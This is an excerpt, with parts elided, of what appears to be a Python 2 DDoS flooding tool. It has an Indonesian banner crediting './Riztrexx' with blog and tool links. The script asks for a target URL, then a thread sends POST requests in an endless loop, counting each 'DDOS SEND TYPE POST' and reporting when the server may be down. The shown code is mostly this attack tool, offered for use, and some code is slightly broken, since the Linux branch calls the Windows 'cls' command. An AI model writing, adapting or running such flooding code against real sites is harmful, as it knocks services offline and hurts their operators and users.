...
if sys.platform == "linux" or sys.platform == "linux2":
    ...
    os.system("cls")
print ("\033[1;34m #!/bin/env python\033[1;m")
print ("\033[1;34m\033[1;m")
print ("\033[1;34m Dibuat Oleh ./Riztrexx\033[1;m")
print ("\033[1;34m #================================================#\033[1;m")
print ("\033[1;34m #Author : ./Riztrexx                             #\033[1;m")
print ("\033[1;34m #Blog   : https://blog-meta-cyber.web.app        #\033[1;m")
print ("\033[1;34m #Tools  : https://tools-fct.web.app              #\033[1;m")
print ("\033[1;34m #================================================#\033[1;m")

print ("\033[1;32m")
url = raw_input("[?] TARGET MU COK [pake http://] :  ").strip()
print ("\033[1;m")
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                urllib2.urlopen(req)
                count += 1
                print ("{0} DDOS SEND TYPE POST".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m SERVER MUNGKIN TELAH DOWN \033[1;m")
                pass
